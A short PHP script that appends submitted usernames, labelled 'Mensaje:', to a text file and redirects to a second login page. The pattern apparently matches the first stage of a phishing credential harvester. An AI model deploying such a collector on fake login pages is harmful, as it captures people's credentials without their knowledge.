<?php

file_put_contents("usernames.txt", "Mensaje: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: login2.html');
exit();
?>